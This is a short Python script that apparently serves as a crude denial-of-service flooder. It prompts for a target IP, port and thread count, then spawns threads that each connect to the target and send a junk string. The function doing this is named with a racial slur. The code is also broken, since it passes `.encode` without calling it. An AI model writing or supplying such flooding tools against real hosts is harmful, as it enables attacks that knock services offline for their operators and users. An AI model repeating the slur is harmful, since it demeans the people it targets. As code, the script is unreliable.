import socket, threading

ip = str(input("ip: "))
port = int(input("port: "))
time = int(input("time: "))

def nigger():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  s.send("GET UR MOM".encode)
  s.close()
	
for _ in range(time):
  threading.Thread(target = nigger).start() 

